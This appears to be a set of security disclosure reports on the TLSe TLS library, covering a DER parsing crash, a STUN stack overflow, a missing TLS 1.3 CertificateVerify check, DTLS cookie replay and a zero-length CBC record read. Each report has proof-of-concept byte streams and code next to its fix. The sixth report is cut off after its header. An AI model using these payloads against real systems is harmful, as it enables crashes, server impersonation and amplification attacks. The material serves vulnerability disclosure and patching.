╭─ VULN-0001 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Zero-length BIT STRING in X.509 DER causes memcpy with size -1       │
│  (remote crash) in TLSe                                                      │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: TLSe (tlslayer) TLS library snapshot                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H                            │
│                                                                              │
│  Description                                                                 │
│  A zero-length BIT STRING in an X.509 DER structure makes the ASN.1 parser   │
│  pass a length of -1 into tls_certificate_set_copy(), which calls memcpy()   │
│  with SIZE_MAX. A TLS peer presenting such a certificate - or any            │
│  application calling the public tls_certificate_parse() on                   │
│  attacker-supplied DER - crashes the process. The trigger is an 11-byte DER  │
│  blob.                                                                       │
│                                                                              │
│  Impact                                                                      │
│  A remote unauthenticated peer can terminate the TLS-hosting process. A      │
│  malicious or MITM server crashes any TLSe client by appending one           │
│  malformed Certificate message to its ServerHello; a TLSe server crashes     │
│  when parsing a client certificate in a mutual-TLS deployment. Because the   │
│  memcpy size is SIZE_MAX the copy always faults at the first unmapped page,  │
│  so the effect is a reliable per-connection crash rather than a controlled   │
│  heap write. Applications that load or inspect certificates from files,      │
│  configuration or an API via tls_certificate_parse() crash on a single       │
│  crafted blob.                                                               │
│                                                                              │
│  Technical Analysis                                                          │
│  _private_asn1_parse() recurses through the DER tree tracking fields[] (the  │
│  child index at each level). A primitive BIT STRING that is the third child  │
│  (idx == 3) of the second nesting level, whose parent is the first child of  │
│  the outer SEQUENCE (fields[0] == 1), is handed to                           │
│  tls_certificate_set_sign_key() at tlse.c:11590. That helper                 │
│  (tlse.c:4597-4605) strips a leading zero byte without checking that         │
│  content remains, so a zero-length BIT STRING makes len become -1.           │
│  tls_certificate_set_copy() (tlse.c:4546-4558) only rejects len == 0, so     │
│  TLS_MALLOC(len + 1) becomes malloc(0) and memcpy(dst, src, (size_t)-1) is   │
│  executed, which always faults.\n\nReachability: tls_consume_stream() ->     │
│  tls_parse_message() -> _private_tls_consume_handshake() ->                  │
│  tls_parse_payload() -> tls_parse_certificate() -> asn1_parse() ->           │
│  _private_asn1_parse(), i.e. the certificate comes straight from the wire.   │
│  The same expression is reachable with no handshake at all through the       │
│  exported tls_certificate_parse() API.\n\nThe 0x00 byte checked by val[0]    │
│  is the tag byte of the TLV that follows the zero-length BIT STRING, so the  │
│  trigger is fully attacker-controlled.                                       │
│                                                                              │
│  PoC Description                                                             │
│  1. Write the 11-byte DER blob 3008050005000300000000 to a file; it is a     │
│  SEQUENCE whose first element is a SEQUENCE containing three elements, the   │
│  third a zero-length BIT STRING followed by a 0x00 byte.\n2. Feed it to      │
│  tls_certificate_parse() for the minimal local reproduction.\n3. For the     │
│  remote reproduction, wrap the DER in a Certificate handshake message:       │
│  certificate_list length 0x00000e, certificate length 0x00000b, then the     │
│  DER, wrapped in handshake type 0x0b inside a TLS record of type 0x16.\n4.   │
│  Prepend a ServerHello record so the handshake state machine accepts the     │
│  Certificate, then feed the 105-byte stream to a TLS client context through  │
│  tls_consume_stream().\n5. Both cases abort: the instrumented build reports  │
│  AddressSanitizer negative-size-param (size=-1) in memcpy; the               │
│  uninstrumented build aborts in glibc malloc or dies with SIGSEGV.           │
│                                                                              │
│  PoC Code                                                                    │
│  ```python\n# Minimal DER: SEQUENCE { SEQUENCE { NULL, NULL, BIT STRING      │
│  len=0 } 0x00 0x00 }\nDER = bytes.fromhex("3008050005000300000000")\n\ndef   │
│  certificate_record(der):\n    body = b"\x00\x00\x0e" +                      │
│  len(der).to_bytes(3, "big") + der\n    hs   = b"\x0b" +                     │
│  len(body).to_bytes(3, "big") + body\n    return b"\x16\x03\x03" +           │
│  len(hs).to_bytes(2, "big") + hs\n\nopen("poc.der", "wb").write(DER)   #     │
│  local: tls_certificate_parse()\n\nserver_hello = bytes.fromhex(\n           │
│  "160301004a0200004603"\n                                                    │
│  "036afc2dabbc4b8d3de57f4b06cdec6f7c848436907f19fcf3f9d3f1e256"\n            │
│  "8ff6222029f918402858326e43509c292ef48162eefe435590c310228c0f"\n            │
│  "a134ca622177c013001")\nflight = server_hello +                             │
│  certificate_record(DER)\nopen("poc_flight.bin", "wb").write(flight)  #      │
│  remote: tls_consume_stream()\nprint(len(flight), flight.hex())\n```         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: tlse.c:4597-4601                                              │
│    Root cause: leading zero stripped without checking content remains        │
│    Fix:                                                                      │
│    - void tls_certificate_set_sign_key(struct TLSCertificate *cert, const    │
│  unsigned char *val, int len) {                                              │
│      if (!val[0]) {                                                          │
│          val++;                                                              │
│          len--;                                                              │
│      }                                                                       │
│    + void tls_certificate_set_sign_key(struct TLSCertificate *cert, const    │
│  unsigned char *val, int len) {                                              │
│      if ((len > 0) && (!val[0])) {                                           │
│          val++;                                                              │
│          len--;                                                              │
│      }                                                                       │
│                                                                              │
│    Location 2: tlse.c:4549-4557                                              │
│    Defence in depth: reject non-positive lengths and never leave a freed     │
│  pointer behind                                                              │
│    Fix:                                                                      │
│    -     TLS_FREE(*member);                                                  │
│      if (len) {                                                              │
│          *member = (unsigned char *)TLS_MALLOC(len + 1);                     │
│          if (*member) {                                                      │
│              memcpy(*member, val, len);                                      │
│              (*member)[len] = 0;                                             │
│          }                                                                   │
│      } else                                                                  │
│          *member = NULL;                                                     │
│  }                                                                           │
│    +     TLS_FREE(*member);                                                  │
│      *member = NULL;                                                         │
│      if (len > 0) {                                                          │
│          *member = (unsigned char *)TLS_MALLOC(len + 1);                     │
│          if (*member) {                                                      │
│              memcpy(*member, val, len);                                      │
│              (*member)[len] = 0;                                             │
│          }                                                                   │
│      }                                                                       │
│  }                                                                           │
│                                                                              │
│  Remediation                                                                 │
│  Perform the leading-zero strip in tls_certificate_set_sign_key() only when  │
│  the element actually has content, and make tls_certificate_set_copy()       │
│  treat every non-positive length as "no value" while clearing the            │
│  destination pointer. Note that fixing only the copy helper is               │
│  insufficient: the pointer is already advanced past the value, so the        │
│  length guard in the caller is required as well. Add DER fuzz coverage for   │
│  zero-length primitive elements to prevent regressions.                      │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Stack buffer overflow in tls_stun_parse() key construction           │
│  (WebRTC/STUN, pre-auth)                                                     │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 8.2                                                             │
│                                                                              │
│  Target: TLSe (tlslayer) TLS library snapshot - STUN / WebRTC DTLS path      │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L                            │
│                                                                              │
│  Description                                                                 │
│  tls_stun_parse() builds a "username:realm:password" string in a 1230-byte   │
│  stack buffer without bounding the attribute lengths it has already          │
│  accepted. A STUN binding request whose USERNAME (up to 513 bytes) and       │
│  REALM (up to 763 bytes) attributes are both maximal overflows the buffer    │
│  by up to 47 bytes with fully attacker-controlled data. The write happens    │
│  before MESSAGE-INTEGRITY is checked, so an unauthenticated single UDP       │
│  datagram triggers it.                                                       │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated attacker who can send a UDP datagram to a TLSe           │
│  WebRTC/DTLS peer connection writes up to 47 bytes of fully controlled data  │
│  past a 1230-byte stack buffer, corrupting the tls_stun_parse() frame. The   │
│  overwritten region holds other locals of that frame, so the immediate       │
│  demonstrated effect is corruption of program state in the TLS terminator    │
│  plus an AddressSanitizer-detected abort; whether the overwrite reaches      │
│  saved control data depends on the compiler's frame layout, and code         │
│  execution was not demonstrated. Because the parser runs before any DTLS     │
│  handshake or STUN authentication, no credential is required.                │
│                                                                              │
│  Technical Analysis                                                          │
│  tls_stun_parse() (tlse.c:13070) declares `char key[0x4CE]` at               │
│  tlse.c:13085. Attribute handlers accept USERNAME up to 513 bytes            │
│  (tlse.c:13184) and REALM up to 763 bytes (tlse.c:13233); nothing checks     │
│  their sum against the destination, and the caller passes the                │
│  library-generated 24-character local_pwd, so the maximum concatenation is   │
│  513 + 1 + 763 + 1 + 24 + 1 = 1303 bytes against a 1230-byte buffer.\n\nThe  │
│  copies happen inside the MESSAGE-INTEGRITY handler (tlse.c:13201-13210)     │
│  while assembling the HMAC key, i.e. before the integrity value is computed  │
│  or compared, so no authentication is required. The same block also          │
│  contains a separate defect: `ptr += username_len;` after copying the REALM  │
│  advances by the wrong length, so the second separator and the password are  │
│  written at incorrect offsets.\n\nEntry point: tls_peerconnection_iterate()  │
│  at tlse.c:14006 calls tls_stun_parse() for any datagram that tls_is_stun()  │
│  accepts, and tls_is_stun() only verifies the four magic-cookie bytes        │
│  0x2112A442. The parser is therefore reachable pre-authentication from one   │
│  spoofable UDP datagram in any product using the WebRTC DTLS-SRTP support.   │
│                                                                              │
│  PoC Description                                                             │
│  1. Build a STUN binding request: type 0x0001, attribute section length      │
│  0x0520, magic cookie 0x2112A442, a 12-byte transaction ID.\n2. Append a     │
│  USERNAME attribute (type 0x0006) with 513 bytes of filler, a REALM          │
│  attribute (type 0x0014) with 763 bytes of filler, and a MESSAGE-INTEGRITY   │
│  attribute (type 0x0008) with 20 zero bytes. The 513 and 763 limits are      │
│  exactly the maxima the parser permits.\n3. Deliver the 1332-byte datagram   │
│  to tls_peerconnection_iterate() through a TLSRTCPeerConnection created      │
│  with tls_peerconnection_context().\n4. tls_is_stun() accepts it on the      │
│  magic cookie alone; tls_stun_parse() builds the "username:realm:password"   │
│  key and writes 47 bytes past char key[0x4CE].\n5. The instrumented build    │
│  reports AddressSanitizer stack-buffer-overflow (WRITE of size 763) at       │
│  tlse.c:13210.                                                               │
│                                                                              │
│  PoC Code                                                                    │
│  ```python\nimport struct\n\ndef attr(kind, value):\n    pad = (4 -          │
│  len(value) % 4) % 4\n    return struct.pack(">HH", kind, len(value)) +      │
│  value + b"\x00" * pad\n\nusername = b"U" * 513          # max accepted by   │
│  the parser\nrealm    = b"R" * 763          # max accepted by the            │
│  parser\nintegrity = b"\x00" * 20\n\nattrs = attr(0x0006, username) +        │
│  attr(0x0014, realm) + attr(0x0008, integrity)\nstun  = struct.pack(">HH",   │
│  0x0001, len(attrs)) + b"\x21\x12\xa4\x42" + b"T" * 12 + attrs\nassert       │
│  len(stun) == 1332\nopen("stun_poc.bin",                                     │
│  "wb").write(stun)\nprint(stun.hex())\n```\n\nDelivered through the          │
│  library's own entry point:\n\n```c\ntls_init();\nchannel =                  │
│  tls_peerconnection_context(0, verify_cb,                                    │
│  NULL);\ntls_peerconnection_connect(channel,                                 │
│  NULL);\ntls_peerconnection_iterate(channel, (unsigned char *)stun, len,     │
│  addr, 0, 0, NULL, &validate);\n```                                          │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: tlse.c:13201-13214                                            │
│    Root cause: unbounded concatenation into key[0x4CE], plus wrong pointer   │
│  advance for REALM                                                           │
│    Fix:                                                                      │
│    -                 if ((realm) && (realm_len > 0)) {                       │
│                      ptr = key;                                              │
│                      memcpy(ptr, username, username_len);                    │
│                      ptr += username_len;                                    │
│                                                                              │
│                      *ptr = ':';                                             │
│                      ptr ++;                                                 │
│                                                                              │
│                      if ((realm) && (realm_len > 0)) {                       │
│                          memcpy(ptr, realm, realm_len);                      │
│                          ptr += username_len;                                │
│                          *ptr = ':';                                         │
│                          ptr ++;                                             │
│                      }                                                       │
│    +                 if ((realm) && (realm_len > 0)) {                       │
│                      if ((unsigned int)(username_len + realm_len + pwd_len   │
│  + 3) > sizeof(key))                                                         │
│                          return TLS_BROKEN_PACKET;                           │
│                      ptr = key;                                              │
│                      memcpy(ptr, username, username_len);                    │
│                      ptr += username_len;                                    │
│                                                                              │
│                      *ptr = ':';                                             │
│                      ptr ++;                                                 │
│                                                                              │
│                      if ((realm) && (realm_len > 0)) {                       │
│                          memcpy(ptr, realm, realm_len);                      │
│                          ptr += realm_len;                                   │
│                          *ptr = ':';                                         │
│                          ptr ++;                                             │
│                      }                                                       │
│                                                                              │
│  Remediation                                                                 │
│  Compute the total length of the concatenated key (username + realm +        │
│  password + separators + terminator) and reject the message with             │
│  TLS_BROKEN_PACKET when it cannot fit in the destination buffer, before      │
│  performing any copy. Also correct the pointer advance for the REALM         │
│  attribute, which currently uses the USERNAME length and therefore writes    │
│  the separator and password at the wrong offsets. Alternatively, build the   │
│  key with a length-tracking helper that cannot overrun, and lower the        │
│  per-attribute limits so their sum is provably within the buffer.            │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0003 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: TLS 1.3 client accepts Finished without CertificateVerify, enabling  │
│  certificate impersonation                                                   │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.4                                                             │
│                                                                              │
│  Target: tlse.c - TLS 1.3 client handshake state machine                     │
│                                                                              │
│  Endpoint: tls_parse_payload case 0x14 (Finished) / case 0x0F                │
│  (CertificateVerify)                                                         │
│                                                                              │
│  Method: TLS 1.3 handshake                                                   │
│                                                                              │
│  CVSS Vector: AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The TLS 1.3 client state machine does not require the server's              │
│  CertificateVerify message. A server that performs its own key exchange,     │
│  replays any certificate that satisfies the application's validation         │
│  callback, and then sends Finished is accepted as authenticated - although   │
│  it never proved possession of the certificate's private key. Any active     │
│  man-in-the-middle can therefore impersonate the server to a TLSe client,    │
│  including for certificates that validate against the configured trust       │
│  roots.                                                                      │
│                                                                              │
│  Impact                                                                      │
│  Complete loss of server authentication for TLS 1.3 clients: an on-path      │
│  attacker impersonates any server whose certificate it can obtain (public    │
│  information), reads and modifies all application traffic, and captures      │
│  credentials and session data. The application's certificate_verify          │
│  callback runs and reports success, so the embedding application has no      │
│  signal that the peer was never authenticated.                               │
│                                                                              │
│  Technical Analysis                                                          │
│  In TLS 1.3 the only proof that a peer owns the private key for the          │
│  certificate it presents is the CertificateVerify signature over the         │
│  handshake transcript. tls_parse_payload handles case 0x0F                   │
│  (CertificateVerify) only if it arrives, and case 0x14 (Finished) accepts    │
│  the message whenever connection_status is at least 2 (tls_parse_finished,   │
│  tlse.c:9271). No state records that CertificateVerify was received:         │
│  CHECK_HANDSHAKE_STATE(context, 8, 1) merely limits repeated                 │
│  CertificateVerify messages, it does not make one mandatory.                 │
│                                                                              │
│  An attacker therefore sends ServerHello with its own key_share,             │
│  EncryptedExtensions, Certificate (a replayed certificate), and Finished.    │
│  It knows the ECDHE shared secret because it chose its own key share, so it  │
│  can compute the handshake traffic keys and produce a valid Finished over    │
│  the transcript it actually sent. The client validates the certificate       │
│  through the application callback, verifies Finished, sets                   │
│  connection_status to 0xFF, and reports tls_established() == 1.              │
│                                                                              │
│  This implementation never negotiates PSK (the pre_shared_key and            │
│  psk_key_exchange_modes extensions are only dumped, never sent or            │
│  processed), so certificate authentication is always in use and              │
│  CertificateVerify is always required.                                       │
│                                                                              │
│  PoC Description                                                             │
│  1. Create a local CA and a server certificate for CN=bank.example; give     │
│  the client only the CA as a trust root, so normal chain validation          │
│  applies.                                                                    │
│  2. Build a server from this library with the single change that the server  │
│  flight omits tls_build_certificate_verify(), modelling an attacker that     │
│  holds only the public certificate.                                          │
│  3. Start the server with tls_load_certificates() given the certificate PEM  │
│  without its private key; it reports 1 (certificate only, no key).           │
│  4. Run an unmodified TLS 1.3 client whose certificate_verify callback       │
│  performs leaf validity, chain-to-trusted-root and subject-vs-SNI checks.    │
│  5. The callback returns no_error, the client reports tls_established() ==   │
│  1, and sends its request; the attacker server reads it in plaintext.        │
│  6. Control: the same client against an unmodified server that does send     │
│  CertificateVerify also completes, showing the client is otherwise           │
│  functional and that the only difference is the missing message.             │
│                                                                              │
│  PoC Code                                                                    │
│  Attacker server (built from a copy of tlse.c with the CertificateVerify     │
│  packet removed from the server flight):\n\n  ctx = tls_create_context(1,    │
│  TLS_V13);\n  tls_load_certificates(ctx, cert_pem_without_key, len);   /*    │
│  returns 1: no private key */\n  /* loop: tls_consume_stream(ctx, recv_buf,  │
│  n, NULL); send tls_get_write_buffer(ctx); */\n\nVictim client (unmodified   │
│  library):\n\n  ctx = tls_create_context(0, TLS_V13);\n                      │
│  tls_load_root_certificates(ctx, ca_pem, len);\n  tls_sni_set(ctx,           │
│  "bank.example");\n  tls_client_connect(ctx);\n  /* loop:                    │
│  tls_consume_stream(ctx, recv_buf, n, verify_cb); */\n\nverify_cb: check     │
│  tls_certificate_is_valid, tls_certificate_chain_is_valid_root,\n            │
│  tls_certificate_valid_subject; return no_error (255) when all pass.         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: tlse.c:10078-10079                                            │
│    Require CertificateVerify before accepting the server Finished            │
│    Fix:                                                                      │
│    -             case 0x14:                                                  │
│                  DEBUG_PRINT0(" => FINISHED\n");                             │
│    +             case 0x14:                                                  │
│                  DEBUG_PRINT0(" => FINISHED\n");                             │
│  #ifdef WITH_TLS_13                                                          │
│                  /*  TLS 1.3 authenticates the peer with CertificateVerify;  │
│  it is the                                                                   │
│                      only proof of possession of the certificate private     │
│  key, and no                                                                 │
│                      PSK handshake exists in this implementation to omit     │
│  it. */                                                                      │
│                  if ((!context->is_server) && ((context->version ==          │
│  TLS_V13) || (context->version == DTLS_V13)) && (!context->hs_messages[8]))  │
│  {                                                                           │
│                      DEBUG_PRINT0("* FINISHED WITHOUT CERTIFICATE            │
│  VERIFY\n");                                                                 │
│                      payload_res = TLS_UNEXPECTED_MESSAGE;                   │
│                      break;                                                  │
│                  }                                                           │
│  #endif                                                                      │
│                                                                              │
│  Remediation                                                                 │
│  Require the server's CertificateVerify before accepting Finished on a TLS   │
│  1.3 client, and abort with unexpected_message when it is absent. Track a    │
│  dedicated per-handshake flag rather than reusing the repeat counter if the  │
│  state machine is refactored. Consider applying the same requirement in the  │
│  opposite direction for deployments that mandate client authentication, so   │
│  that a client cannot complete a handshake without proving possession of     │
│  its certificate key.                                                        │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0004 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: DTLS cookie is not bound to the client source address, allowing      │
│  replay to spoofed peers and amplification                                   │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 5.3                                                             │
│                                                                              │
│  Target: tlse.c - DTLS HelloVerifyRequest cookie                             │
│  (_private_dtls_build_cookie, tls_parse_hello)                               │
│                                                                              │
│  Endpoint: tls_parse_hello / _private_dtls_build_cookie                      │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L                            │
│                                                                              │
│  Description                                                                 │
│  The DTLS HelloVerifyRequest cookie is computed as HMAC-SHA256(per-process   │
│  secret, client_random) and carries no information about the client's        │
│  source address. A cookie obtained once from the attacker's own address is   │
│  therefore accepted from any other (spoofed) source address as long as the   │
│  same client_random is replayed, defeating the address-validation purpose    │
│  of the cookie exchange and enabling a reflected amplification and           │
│  state-exhaustion primitive.                                                 │
│                                                                              │
│  Impact                                                                      │
│  An attacker with one legitimately obtained cookie can make the server       │
│  perform a full handshake - ephemeral key generation plus certificate and    │
│  ServerKeyExchange transmission - toward arbitrary spoofed source            │
│  addresses. This gives about 22x traffic amplification toward third-party    │
│  victims and unbounded per-address state creation from a small number of     │
│  packets, with no ability to receive the replies. The address-binding        │
│  property that the DTLS cookie exchange exists to provide is absent.         │
│                                                                              │
│  Technical Analysis                                                          │
│  _private_dtls_build_cookie (tlse.c:7775) computes the cookie as             │
│  HMAC-SHA256 keyed with the per-process dtls_secret over                     │
│  context->remote_random only. tls_parse_hello then compares the cookie       │
│  carried in the second ClientHello with the value it rebuilds for that       │
│  context (tlse.c:8218-8228) and accepts the handshake when they              │
│  match.\n\nBecause remote_random is chosen by the client, the cookie is a    │
│  deterministic function of attacker-chosen input. An attacker obtains one    │
│  cookie for a random R from its own address, then replays (R, cookie) from   │
│  any spoofed address: a fresh per-address context has no stored cookie,      │
│  rebuilds HMAC(secret, R), matches, and proceeds. The value proves only      │
│  that the client once received a HelloVerifyRequest for R - not that it can  │
│  receive traffic at the claimed address.\n\nOn acceptance tls_parse_payload  │
│  sets dtls_cookie_verified and builds the complete server flight             │
│  (ServerHello, Certificate, ServerKeyExchange, ServerHelloDone), including   │
│  ephemeral key generation, toward the claimed address.                       │
│                                                                              │
│  PoC Description                                                             │
│  1. Send a DTLS 1.2 ClientHello with cookie_len 0 and a chosen               │
│  client_random to a fresh server context; the server replies with            │
│  HelloVerifyRequest containing a 32-byte cookie.                             │
│  2. Extract the cookie from the HelloVerifyRequest.                          │
│  3. Send the identical ClientHello again, this time carrying that cookie,    │
│  to five brand-new server contexts that stand for five different source      │
│  addresses.                                                                  │
│  4. All five accept the cookie and each answers with the full server flight  │
│  (ServerHello, Certificate, ServerKeyExchange, ServerHelloDone): 2257 bytes  │
│  for a 99-byte request.                                                      │
│  5. Because the cookie is HMAC(secret, client_random) with no address        │
│  input, the same cookie is valid for every address, so the exchange does     │
│  not validate reachability of the claimed source.                            │
│                                                                              │
│  PoC Code                                                                    │
│  /* Build a minimal DTLS 1.2 ClientHello with an optional cookie.            │
│  */\nstatic int build_hello(unsigned char *out, const unsigned char          │
│  *random, const unsigned char *cookie, int cookie_len) {\n    unsigned char  │
│  *p = out; int body_len, i;\n    *p++=0x16; *p++=0xFE; *p++=0xFD; *p++=0;    │
│  *p++=0;\n    for (i=0;i<6;i++) *p++=0;\n    *p++=0; *p++=0;                 │
│  /* record length, patched */\n    *p++=0x01; *p++=0; *p++=0; *p++=0;    /*  │
│  handshake length     */\n    *p++=0; *p++=0; *p++=0; *p++=0; *p++=0;        │
│  *p++=0; *p++=0; *p++=0; *p++=0;\n    *p++=0xFE; *p++=0xFD;\n    memcpy(p,   │
│  random, 32); p += 32;\n    *p++=0; *p++=(unsigned char)cookie_len;\n    if  │
│  (cookie_len) { memcpy(p, cookie, cookie_len); p += cookie_len; }\n          │
│  *p++=0; *p++=2; *p++=0xC0; *p++=0x2F;\n    *p++=1; *p++=0;\n                │
│  body_len=(int)(p-out)-25;\n    out[11]=(unsigned char)(((p-out)-13)>>8);    │
│  out[12]=(unsigned char)((p-out)-13);\n    out[14]=0; out[15]=(unsigned      │
│  char)(body_len>>8); out[16]=(unsigned char)body_len;\n    out[22]=out[14];  │
│  out[23]=out[15]; out[24]=out[16];\n    return (int)(p-out);\n}\n\n/*        │
│  Obtain a cookie from a first server context, then replay it into fresh      │
│  ones. */\nlen = build_hello(hello, random, NULL,                            │
│  0);\ntls_consume_stream(srv1, hello, len, NULL);\nout =                     │
│  tls_get_write_buffer(srv1, &out_len);\ncookie_len = out[27];                │
│  memcpy(cookie, out + 28, cookie_len);\nfor (i = 0; i < 5; i++) {\n          │
│  struct TLSContext *s = tls_create_context(1, DTLS_V12);\n                   │
│  tls_load_certificates(s, pem, pem_len);\n    len = build_hello(hello,       │
│  random, cookie, cookie_len);\n    tls_consume_stream(s, hello, len, NULL);  │
│  /* accepted: full flight generated */\n    tls_destroy_context(s);\n}       │
│                                                                              │
│  Remediation                                                                 │
│  Bind the cookie to the peer transport address: derive it as                 │
│  HMAC-SHA256(secret, client_random || source address || source port) and     │
│  verify it against the address the datagram actually arrived from before     │
│  accepting the ClientHello. Because the library currently has no notion of   │
│  a peer address, this requires exposing the address to the DTLS layer - for  │
│  example a tls_set_peer_address(context, addr, addrlen) call that the        │
│  datagram server invokes before tls_consume_stream, or a callback the        │
│  library uses when building and verifying the cookie. Additionally,          │
│  rate-limit cookie issuance per source and avoid generating a full server    │
│  flight until the cookie has been validated against the address, so a        │
│  replayed cookie cannot trigger certificate transmission to a third party.   │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0005 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Zero-length CBC record triggers 1-byte heap out-of-bounds read       │
│  (pt[-1]) in tls_parse_message                                               │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 5.3                                                             │
│                                                                              │
│  Target: TLSe (tlslayer) TLS library snapshot - record layer                 │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L                            │
│                                                                              │
│  Description                                                                 │
│  When a zero-length record is processed after a CBC cipher suite has been    │
│  installed, tls_parse_message() allocates a zero-length plaintext buffer     │
│  and then reads pt[length - 1], i.e. one byte before the allocation. The     │
│  attacker controls when this happens (any CBC suite plus ChangeCipherSpec),  │
│  so a single malformed record reaches an out-of-bounds heap read on an       │
│  unauthenticated connection.                                                 │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated remote peer can make the TLS terminator read one byte    │
│  outside a heap allocation on every such connection attempt. The byte is     │
│  not returned to the attacker and the record is rejected immediately         │
│  afterwards, so no data is disclosed; the demonstrated effect is a           │
│  sanitizer-detected out-of-bounds read that aborts hardened builds, and a    │
│  small information-free side effect in normal builds. It is a memory-safety  │
│  defect on a pre-authentication path but its standalone impact is limited.   │
│                                                                              │
│  Technical Analysis                                                          │
│  In tls_parse_message(), the non-AEAD branch allocates the plaintext buffer  │
│  with the record payload length and immediately reads the last byte of the   │
│  plaintext as the CBC padding byte:\n\n```c title=tlse.c                     │
│  startLineNumber=10503 endLineNumber=10505\n        pt = (unsigned char      │
│  *)TLS_MALLOC(length);\n```\n\n```c title=tlse.c startLineNumber=10713       │
│  endLineNumber=10716\n            padding_byte = pt[length - 1];\n           │
│  padding = padding_byte + 1;\n```\n\nWhen length is zero, TLS_MALLOC(0)      │
│  returns a minimal heap chunk and pt[length - 1] reads the byte immediately  │
│  before it. The AEAD branch guards against short records (tlse.c:10495) but  │
│  the CBC branch does not, and the only earlier precondition is               │
│  context->cipher_spec_set, which the attacker establishes by sending         │
│  ChangeCipherSpec after offering a CBC suite in the ClientHello.\n\nAfter    │
│  the read, padding_index is negative so the padding check is skipped,        │
│  decrypted_length stays zero, and the length < mac_size test at              │
│  tlse.c:10755 returns TLS_BROKEN_PACKET. The defect is therefore a pure      │
│  out-of-bounds read with no further propagation.                             │
│                                                                              │
│  PoC Description                                                             │
│  1. Build a 176-byte stream of three records for a TLS 1.2 server: a         │
│  ClientHello offering a CBC cipher suite, a ClientKeyExchange, and a         │
│  ChangeCipherSpec record.\n2. Append a fourth record whose payload length    │
│  is zero (for example 16 03 01 00 00).\n3. Feed the stream to a server       │
│  context through tls_consume_stream().\n4. Because the cipher suite is CBC,  │
│  tls_parse_message() allocates a zero-length plaintext buffer and executes   │
│  pt[length - 1], reading one byte before the allocation.\n5. The             │
│  instrumented build reports AddressSanitizer heap-buffer-overflow READ of    │
│  size 1 at tlse.c:10715; removing the final empty record stops the crash,    │
│  confirming it as the trigger.                                               │
│                                                                              │
│  PoC Code                                                                    │
│  ```python\nd = open("crash_input.bin", "rb").read()[:176]   # 176-byte      │
│  prefix is the minimum\nopen("empty_record_poc.bin",                         │
│  "wb").write(d)\nprint(d.hex())\n```\n\nStructure of the 176 bytes (record   │
│  header: type, version, length):\n\n```\noff   0  type=16 ver=0301 len=85    │
│  ClientHello, offers a CBC suite\noff  90  type=16 ver=0301 len=70           │
│  ClientKeyExchange\noff 165  type=14 ver=0301 len=1   ChangeCipherSpec       │
│  (installs the CBC cipher)\noff 171  type=16 ver=0301 len=0   zero-length    │
│  record -> pt[-1] is read\n```\n\nMinimal hand-built equivalent for the      │
│  last three records (the ClientHello must offer a CBC                        │
│  suite):\n\n```python\ndef rec(t, ver, payload):\n    return bytes([t]) +    │
│  ver + len(payload).to_bytes(2, "big") + payload\n\nstream =                 │
│  client_hello_cbc + rec(0x16, b"\\x03\\x01", client_key_exchange) \\\n       │
│  + rec(0x14, b"\\x03\\x01", b"\\x01") \\\n       + rec(0x16, b"\\x03\\x01",  │
│  b"")\n```                                                                   │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: tlse.c:10714-10716                                            │
│    Guard the CBC padding-byte read against a zero-length plaintext           │
│    Fix:                                                                      │
│    -             padding_byte = pt[length - 1];                              │
│              padding = padding_byte + 1;                                     │
│    +             if (!length) {                                              │
│                  TLS_FREE(pt);                                               │
│                  DEBUG_PRINT0("BROKEN PACKET (empty CBC record)\n");         │
│                  _private_tls_write_packet(tls_build_alert(context, 1,       │
│  bad_record_mac));                                                           │
│                  return TLS_BROKEN_PACKET;                                   │
│              }                                                               │
│              padding_byte = pt[length - 1];                                  │
│              padding = padding_byte + 1;                                     │
│                                                                              │
│  Remediation                                                                 │
│  Validate the record payload length against the minimum ciphertext size for  │
│  the negotiated cipher suite (at least one padding byte plus the MAC         │
│  length, plus the implicit IV where applicable) before decrypting, and       │
│  reject shorter records with a bad_record_mac-style error. Additionally,     │
│  guard the padding-byte read so it is only evaluated when the decrypted      │
│  length is non-zero, so no code path can index pt[-1] even if the earlier    │
│  validation changes.                                                         │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0006 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Pre-authentication stack buffer overflow in DTLS fragmented          │
│  handshake reassembly (TLSe)                                                 │
│                                                                              │
│  Severity: CRITICAL                                                          │
│                                                                              │
│  CVSS Score: 9.1                                                             │
│                                                                              │
